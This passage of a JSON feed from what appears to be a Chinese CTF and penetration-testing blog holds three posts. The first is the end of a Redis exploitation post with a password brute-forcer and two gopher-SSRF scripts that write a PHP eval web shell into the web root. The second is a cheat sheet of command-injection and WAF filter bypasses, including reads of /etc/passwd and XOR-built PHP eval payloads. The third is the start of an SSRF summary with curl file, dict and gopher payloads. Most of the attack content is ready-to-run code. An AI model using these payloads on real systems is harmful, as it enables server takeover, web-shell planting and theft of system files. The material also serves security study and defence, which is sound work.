class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">r&#x27;d:\\test\\top100.txt&#x27;</span>, <span class=\"string\">&#x27;r&#x27;</span>) <span class=\"keyword\">as</span> f: <span class=\"comment\">#字典</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">100</span>):</span><br><span class=\"line\">        passwd = f.readline()</span><br><span class=\"line\">        all_url = url + param + passwd</span><br><span class=\"line\">        <span class=\"comment\"># print(all_url)</span></span><br><span class=\"line\">        request = urllib.request.Request(all_url)</span><br><span class=\"line\">        response = urllib.request.urlopen(request).read()</span><br><span class=\"line\">        <span class=\"comment\"># print(response)</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&quot;+OK\\r\\n+OK\\r\\n&quot;</span>.encode() <span class=\"keyword\">in</span> response:  <span class=\"comment\">#因为是不知道是否正确，可以用not in</span></span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;redis passwd: &quot;</span> + passwd)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>Payload 构造脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> urllib.parse</span><br><span class=\"line\">protocol=<span class=\"string\">&quot;gopher://&quot;</span></span><br><span class=\"line\">ip=<span class=\"string\">&quot;127.0.0.1&quot;</span></span><br><span class=\"line\">port=<span class=\"string\">&quot;6379&quot;</span></span><br><span class=\"line\">shell=<span class=\"string\">&quot;\\n\\n&lt;?php eval($_GET[\\&quot;cmd\\&quot;]);?&gt;\\n\\n&quot;</span></span><br><span class=\"line\">filename=<span class=\"string\">&quot;1.php&quot;</span></span><br><span class=\"line\">path=<span class=\"string\">&quot;/var/www/html&quot;</span></span><br><span class=\"line\">passwd=<span class=\"string\">&quot;&quot;</span>        <span class=\"comment\">#如果无密码就不加，如果有密码就加 </span></span><br><span class=\"line\">cmd=[<span class=\"string\">&quot;flushall&quot;</span>,</span><br><span class=\"line\">     <span class=\"string\">&quot;set 1 &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(shell.replace(<span class=\"string\">&quot; &quot;</span>,<span class=\"string\">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class=\"line\">     <span class=\"string\">&quot;config set dir &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(path),</span><br><span class=\"line\">     <span class=\"string\">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(filename),</span><br><span class=\"line\">     <span class=\"string\">&quot;save&quot;</span></span><br><span class=\"line\">     ]</span><br><span class=\"line\"><span class=\"keyword\">if</span> passwd:</span><br><span class=\"line\">    cmd.insert(<span class=\"number\">0</span>,<span class=\"string\">&quot;AUTH &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(passwd))</span><br><span class=\"line\">payload=protocol+ip+<span class=\"string\">&quot;:&quot;</span>+port+<span class=\"string\">&quot;/_&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">redis_format</span>(<span class=\"params\">arr</span>):</span><br><span class=\"line\">    CRLF=<span class=\"string\">&quot;\\r\\n&quot;</span></span><br><span class=\"line\">    redis_arr = arr.split(<span class=\"string\">&quot; &quot;</span>)</span><br><span class=\"line\">    cmd=<span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    cmd+=<span class=\"string\">&quot;*&quot;</span>+<span class=\"built_in\">str</span>(<span class=\"built_in\">len</span>(redis_arr))</span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> redis_arr:</span><br><span class=\"line\">        cmd+=CRLF+<span class=\"string\">&quot;$&quot;</span>+<span class=\"built_in\">str</span>(<span class=\"built_in\">len</span>((x.replace(<span class=\"string\">&quot;$&#123;IFS&#125;&quot;</span>,<span class=\"string\">&quot; &quot;</span>))))+CRLF+x.replace(<span class=\"string\">&quot;$&#123;IFS&#125;&quot;</span>,<span class=\"string\">&quot; &quot;</span>)</span><br><span class=\"line\">    cmd+=CRLF</span><br><span class=\"line\">    <span class=\"keyword\">return</span> cmd</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> cmd:</span><br><span class=\"line\">        payload += urllib.parse.quote(redis_format(x))</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(urllib.parse.quote(payload))</span><br></pre></td></tr></table></figure>\n<p>payload2</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: UTF-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> urllib.parse <span class=\"keyword\">import</span> quote</span><br><span class=\"line\"><span class=\"keyword\">from</span> urllib.request <span class=\"keyword\">import</span> Request, urlopen</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">&quot;http://xxxxxx/?url=&quot;</span></span><br><span class=\"line\">gopher = <span class=\"string\">&quot;gopher://127.0.0.1:6379/_&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_password</span>():</span><br><span class=\"line\">    f = <span class=\"built_in\">open</span>(<span class=\"string\">&quot;message.txt&quot;</span>, <span class=\"string\">&quot;r&quot;</span>)         <span class=\"comment\">#密码文件</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> f.readlines()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">encoder_url</span>(<span class=\"params\">cmd</span>):</span><br><span class=\"line\">    urlencoder = quote(cmd).replace(<span class=\"string\">&quot;%0A&quot;</span>, <span class=\"string\">&quot;%0D%0A&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> urlencoder</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">###------暴破密码，无密码可删除-------###</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> password <span class=\"keyword\">in</span> get_password():</span><br><span class=\"line\">    <span class=\"comment\"># 攻击脚本</span></span><br><span class=\"line\">    path = <span class=\"string\">&quot;/var/www/html&quot;</span></span><br><span class=\"line\">    shell = <span class=\"string\">&quot;\\\\n\\\\n\\\\n&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;\\\\n\\\\n\\\\n&quot;</span></span><br><span class=\"line\">    filename = <span class=\"string\">&quot;shell.php&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    cmd = <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    auth %s</span></span><br><span class=\"line\"><span class=\"string\">    quit</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span> % password</span><br><span class=\"line\">    <span class=\"comment\"># 二次编码</span></span><br><span class=\"line\">    encoder = encoder_url(encoder_url(cmd))</span><br><span class=\"line\">    <span class=\"comment\"># 生成payload</span></span><br><span class=\"line\">    payload = url + gopher + encoder</span><br><span class=\"line\">    <span class=\"comment\"># 发起请求</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(payload)</span><br><span class=\"line\">    request = Request(payload)</span><br><span class=\"line\">    response = urlopen(request).read().decode()</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;This time password is:&quot;</span> + password)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Get response is:&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(response)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> response.count(<span class=\"string\">&quot;+OK&quot;</span>) &gt; <span class=\"number\">1</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;find password : &quot;</span> + password)</span><br><span class=\"line\">        <span class=\"comment\">#####---------------如无密码，直接从此开始执行---------------#####</span></span><br><span class=\"line\">        cmd = <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">        auth %s</span></span><br><span class=\"line\"><span class=\"string\">        config set dir %s</span></span><br><span class=\"line\"><span class=\"string\">        config set dbfilename %s</span></span><br><span class=\"line\"><span class=\"string\">        set test1 &quot;%s&quot;</span></span><br><span class=\"line\"><span class=\"string\">        save</span></span><br><span class=\"line\"><span class=\"string\">        quit</span></span><br><span class=\"line\"><span class=\"string\">        &quot;&quot;&quot;</span> % (password, path, filename, shell)</span><br><span class=\"line\">        <span class=\"comment\"># 二次编码</span></span><br><span class=\"line\">        encoder = encoder_url(encoder_url(cmd))</span><br><span class=\"line\">        <span class=\"comment\"># 生成payload</span></span><br><span class=\"line\">        payload = url + gopher + encoder</span><br><span class=\"line\">        <span class=\"comment\"># 发起请求</span></span><br><span class=\"line\">        request = Request(payload)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(payload)</span><br><span class=\"line\">        response = urlopen(request).read().decode()</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;response is:&quot;</span> + response)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> response.count(<span class=\"string\">&quot;+OK&quot;</span>) &gt; <span class=\"number\">5</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Write success！&quot;</span>)</span><br><span class=\"line\">            exit()</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Write failed. Please check and try again&quot;</span>)</span><br><span class=\"line\">            exit()</span><br><span class=\"line\">        <span class=\"comment\">#####---------------如无密码，到此处结束------------------#####</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;Password not found!&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;Please change the dictionary,and try again.&quot;</span>)</span><br></pre></td></tr></table></figure>\n<h1 id=\"redis攻击防范\"><a class=\"anchor\" href=\"#redis攻击防范\">#</a> Redis 攻击防范</h1>\n<ul>\n<li>限制登录 ip</li>\n<li>添加密码</li>\n<li>修改默认端口</li>\n</ul>\n<h1 id=\"参考文献\"><a class=\"anchor\" href=\"#参考文献\">#</a> 参考文献</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMjU2P3RpbWVfXzEzMTE9Q3FqaHElMkJ4MHhJaHJEc0Q3R0FoZW11RHFmeFlxNHhJd0Q=\">Redis 未授权访问漏洞利用总结</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMjI5NT90aW1lX18xMzExPW40JTJCeG5pZURxN3FDcTdLR1FRRHNmMzJFRGdCQkRjQURHd2VlQXdE\">原创 - Redis 漏洞利用与防御</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTMwNzE/dGltZV9fMTMxMT1tcW14bkRCRHVEY0FpUWVEc0Q3bU4wJTNEbnh6bTBRN05EOVlE\">Redis 漏洞及其利用</span></p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2024/03/07/%E4%B8%80%E4%BA%9B%E8%BF%87%E6%BB%A4%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/",
            "url": "http://example.com/2024/03/07/%E4%B8%80%E4%BA%9B%E8%BF%87%E6%BB%A4%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/",
            "title": "某些过滤的绕过方式汇总",
            "date_published": "2024-03-07T01:55:39.000Z",
            "content_html": "<h1 id=\"空格被ban\"><a class=\"anchor\" href=\"#空格被ban\">#</a> 空格被 ban</h1>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$IFS</span>：<span class=\"built_in\">cat</span><span class=\"variable\">$IFS</span><span class=\"string\">&quot;flag&quot;</span>  //引号别忘了(<span class=\"variable\">$IFS</span>：Internal Field Separator，是一个环境变量，用于定义字段（或单词）之间的分隔符。默认情况下，\\<span class=\"variable\">$IFS</span>的值包含空格、制表符和换行符)</span><br><span class=\"line\"><span class=\"variable\">$&#123;IFS&#125;</span>：<span class=\"built_in\">cat</span><span class=\"variable\">$&#123;IFS&#125;</span>flag</span><br><span class=\"line\">$IFS<span class=\"variable\">$1</span></span><br><span class=\"line\">&lt; </span><br><span class=\"line\">&lt;&gt; </span><br><span class=\"line\">&#123;<span class=\"built_in\">cat</span>,flag.php&#125;  //用逗号实现了空格功能</span><br><span class=\"line\">%20 //Space的URL编码</span><br><span class=\"line\">%09 //Tab的URL编码</span><br><span class=\"line\">+</span><br></pre></td></tr></table></figure>\n<h1 id=\"敏感字符串被ban\"><a class=\"anchor\" href=\"#敏感字符串被ban\">#</a> 敏感字符串被 ban</h1>\n<h2 id=\"flag\"><a class=\"anchor\" href=\"#flag\">#</a> flag</h2>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">单引号绕过 fla<span class=\"string\">&#x27;g&#x27;</span></span><br><span class=\"line\">双引号绕过 fla<span class=\"string\">&quot;g&quot;</span></span><br><span class=\"line\">反斜线绕过 f\\lag</span><br><span class=\"line\">变量拼接绕过 a=g;<span class=\"built_in\">cat</span>$IFS$1fla<span class=\"variable\">$a</span>.php</span><br><span class=\"line\">$+任意数字绕过 fl<span class=\"variable\">$1ag</span> </span><br><span class=\"line\">Base64绕过 <span class=\"built_in\">cat</span> flag.php 的<span class=\"built_in\">base64</span>编码为Y2F0IGZsYWcucGhw</span><br><span class=\"line\">内联绕过 将反引号内命令的输出作为输入执行，<span class=\"built_in\">cat</span>$IFS<span class=\"variable\">$9</span>`<span class=\"built_in\">ls</span>`</span><br></pre></td></tr></table></figure>\n<h2 id=\"bin\"><a class=\"anchor\" href=\"#bin\">#</a> bin</h2>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/???/[l]s</span><br><span class=\"line\">/???/[:alnum:]s  //alnum表示字母或数字</span><br><span class=\"line\">/???/[:lower:]s</span><br><span class=\"line\">都等价于/bin/ls</span><br></pre></td></tr></table></figure>\n<h2 id=\"echo\"><a class=\"anchor\" href=\"#echo\">#</a> echo</h2>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?cmd=/???/e???</span><br><span class=\"line\"><span class=\"built_in\">exit</span>(<span class=\"variable\">$a</span>),a=flag 等价于 <span class=\"built_in\">echo</span>(<span class=\"variable\">$flag</span>)</span><br></pre></td></tr></table></figure>\n<h2 id=\"cat\"><a class=\"anchor\" href=\"#cat\">#</a> cat</h2>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">tac</span></span><br><span class=\"line\">cmd=/???/ca? /etc/passwd</span><br><span class=\"line\">cmd=/???/ca? /etc/pass??</span><br><span class=\"line\">cmd=/???/ca? /???/p?????</span><br></pre></td></tr></table></figure>\n<h2 id=\"system\"><a class=\"anchor\" href=\"#system\">#</a> system</h2>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\\system</span><br><span class=\"line\">(sy.(st).em)(<span class=\"built_in\">whoami</span>)</span><br><span class=\"line\">\\x73\\x79\\x73\\x74\\x65\\x6d //十六进制编码</span><br><span class=\"line\">?a=system&amp;b=<span class=\"built_in\">cat</span>+/etc&amp;c=/passwd&amp;code=<span class=\"variable\">$_GET</span>[a](<span class=\"variable\">$_GET</span>[b].<span class=\"variable\">$_GET</span>[c]);</span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"string\">&quot;sy&quot;</span>+<span class=\"string\">&quot;st&quot;</span>+<span class=\"string\">&quot;em&quot;</span>;<span class=\"variable\">$a</span>(<span class=\"built_in\">whoami</span>)</span><br></pre></td></tr></table></figure>\n<h2 id=\"根目录\"><a class=\"anchor\" href=\"#根目录\">#</a> /(根目录)</h2>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chr(<span class=\"string\">&quot;47&quot;</span>)：scandir(chr(<span class=\"string\">&quot;47&quot;</span>))</span><br><span class=\"line\">scandir()</span><br><span class=\"line\">scandir(<span class=\"string\">&#x27;.&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<h2 id><a class=\"anchor\" href=\"#\">#</a> .</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">current(localeconv()) <span class=\"comment\">//current()返回数组中的当前单元, 默认取第一个值;localeconv()返回一包含本地数字及货币格式信息的数组。而数组第一项就是.</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"php\"><a class=\"anchor\" href=\"#php\">#</a> php</h2>\n<h3 id=\"文件后缀\"><a class=\"anchor\" href=\"#文件后缀\">#</a> 文件后缀</h3>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.phtml</span><br><span class=\"line\">.jpg.php</span><br><span class=\"line\">.php.jpg</span><br><span class=\"line\">.php%<span class=\"number\">00</span>.jpg</span><br><span class=\"line\">.php2</span><br><span class=\"line\">.php3</span><br><span class=\"line\">.php4</span><br><span class=\"line\">.phps</span><br><span class=\"line\">.pht</span><br><span class=\"line\">.phtm</span><br><span class=\"line\">.php.abc</span><br><span class=\"line\"><span class=\"number\">111</span>..<span class=\"number\">.111</span>.d.php <span class=\"comment\">//文件名超限让waf奔溃(几十万长度)</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"文件内容\"><a class=\"anchor\" href=\"#文件内容\">#</a> 文件内容</h3>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>换成<span class=\"meta\">&lt;?</span> <span class=\"comment\">//需要开启php.ini中的short_open_tag或编译时使用了--enable-short-tags </span></span><br></pre></td></tr></table></figure>\n<h1 id=\"任意字母被ban\"><a class=\"anchor\" href=\"#任意字母被ban\">#</a> 任意字母被 ban</h1>\n<pre><code>(1)最前面加个空格\n(2)???/??? 等价于 /bin/cat\n$_=`/???/???%20/???/???/????/?????.???`;?&gt;&lt;?=$_?&gt; 等价于 &quot;/bin/cat /var/www/html/index.php&quot;\n&lt;?=等于&lt;?php echo ，是一个快捷语法，$_是一个变量，``一定要加，用于执行命令\n(3)?&gt;&lt;?=`/???/???%20/???/???/????/*`?&gt;（过滤了$_的情况）\n</code></pre>\n<h1 id=\"任意字母数字都被ban\"><a class=\"anchor\" href=\"#任意字母数字都被ban\">#</a> 任意字母数字都被 ban</h1>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(1)用异或操作创造字母和数字 </span><br><span class=\"line\">\t@$_++; // $_ = 1，定义一个变量</span><br><span class=\"line\">    $__=(&quot;#&quot;^&quot;|&quot;); // $__ = _，#和|异或出来的结果是_</span><br><span class=\"line\">\t$__.=(&quot;.&quot;^&quot;~&quot;); // _P，.用于连接</span><br><span class=\"line\">\t$__.=(&quot;/&quot;^&quot;`&quot;); // _PO</span><br><span class=\"line\">\t$__.=(&quot;|&quot;^&quot;/&quot;); // _POS</span><br><span class=\"line\">\t$__.=(&quot;&#123;&quot;^&quot;/&quot;); // _POST </span><br><span class=\"line\">\t$&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]); // $_POST[0]($_POST[1]);</span><br><span class=\"line\">        =&gt;$__=(&quot;#&quot;^&quot;|&quot;).(&quot;.&quot;^&quot;~&quot;).(&quot;/&quot;^&quot;`&quot;).(&quot;|&quot;^&quot;/&quot;).(&quot;&#123;&quot;^&quot;/&quot;);$__=POST(.表示连接)</span><br><span class=\"line\">(2) ?code=$_=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=getFlag</span><br><span class=\"line\">\t$_=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;：`表示执行命令，?表示循环执行,^表示异或</span><br><span class=\"line\">\t相当于&#123;^&lt;(G)、&#123;^&gt;(E)、&#123;^/(T)，所以_就相当于GET，原式变成?code=$_=&quot;GET&quot;;$GET[_]$GET[__]</span><br><span class=\"line\">\t &amp;_=getFlag：&amp;是分隔符，相当于给_赋值为getFlag，原式变成?code=$_=&quot;GET&quot;;$GET[getFlag]$GET[__]</span><br></pre></td></tr></table></figure>\n<h1 id=\"其他方式\"><a class=\"anchor\" href=\"#其他方式\">#</a> 其他方式</h1>\n<h2 id=\"注释混淆\"><a class=\"anchor\" href=\"#注释混淆\">#</a> 注释混淆</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eval(/*-/*-*/$p/*-/*-*//*-/*-*//*-/*-*/);</span><br><span class=\"line\">$p=$_GET[&#x27;x&#x27;]或$p=$_POST[&#x27;x&#x27;]或$p=$_SERVER[&#x27;X&#x27;]</span><br></pre></td></tr></table></figure>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2024/03/04/SSRF%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%80%BB%E7%BB%93/",
            "url": "http://example.com/2024/03/04/SSRF%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%80%BB%E7%BB%93/",
            "title": "SSRF服务器端请求伪造总结",
            "date_published": "2024-03-04T10:22:33.000Z",
            "content_html": "<h1 id=\"什么是ssrf\"><a class=\"anchor\" href=\"#什么是ssrf\">#</a> 什么是 SSRF</h1>\n<p>SSRF (Server Side Request Forgery) 即服务端请求伪造，指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。</p>\n<p>SSRF 攻击通常针对外部网络无法直接访问的内部系统。</p>\n<p>SSRF 可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用 File 协议读取本地文件。</p>\n<h1 id=\"漏洞产生原因\"><a class=\"anchor\" href=\"#漏洞产生原因\">#</a> 漏洞产生原因</h1>\n<p>1、内网服务防御相对外网服务来说一般会较弱</p>\n<p>2、服务端提供了从其他服务器应用获取数据的功能且没有对目标地址作正确的过滤和限制</p>\n<h2 id=\"漏洞点\"><a class=\"anchor\" href=\"#漏洞点\">#</a> 漏洞点</h2>\n<p>函数 (主要是网络访问，支持伪协议的网络读取)</p>\n<ul>\n<li>file_get_contents()</li>\n<li>fsockopen()</li>\n<li>curl_exec()</li>\n</ul>\n<p>伪协议</p>\n<ul>\n<li>file://：从文件系统中获取文件内容，如，file:///etc/passwd</li>\n<li>dict://：字典服务器协议，访问字典资源，如，dict:///ip:6739/info</li>\n<li>gopher://：分布式文档传递服务，可使用<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3RhcnVua2FudC9Hb3BoZXJ1cw==\"> gopherus</span> 生成 payload。</li>\n</ul>\n<h1 id=\"ssrf的利用\"><a class=\"anchor\" href=\"#ssrf的利用\">#</a> SSRF 的利用</h1>\n<h2 id=\"可能存在ssrf的信号\"><a class=\"anchor\" href=\"#可能存在ssrf的信号\">#</a> 可能存在 SSRF 的信号</h2>\n<ul>\n<li>\n<p>能够对外发起网络请求的地方，如在线识图，在线文档翻译，分享，订阅等</p>\n</li>\n<li>\n<p>从远程服务器请求资源，如远程 URL 上传，静态资源图片</p>\n</li>\n<li>\n<p>数据库内置功能，如 mongodb 的 copyDatabase 函数</p>\n</li>\n<li>\n<p>邮件系统，就是接收邮件服务器地址这些地方</p>\n</li>\n<li>\n<p>文件处理，在线处理工具等，如 ffpmg,ImageMaic，DOCX，PDF，XML 处理器等</p>\n</li>\n<li>\n<p>看 URL 的关键字，如 source,share,link,src,imageurl,target 等</p>\n</li>\n</ul>\n<h2 id=\"利用方式\"><a class=\"anchor\" href=\"#利用方式\">#</a> 利用方式</h2>\n<p>使用 curl，实现 dict 协议操作 Redis、file 协议读文件、gopher 协议反弹 Shell 等功能，payload 如下</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -vvv <span class=\"string\">&#x27;dict://127.0.0.1:6379/info&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">curl -vvv <span class=\"string\">&#x27;file:///etc/passwd&#x27;</span></span><br><span 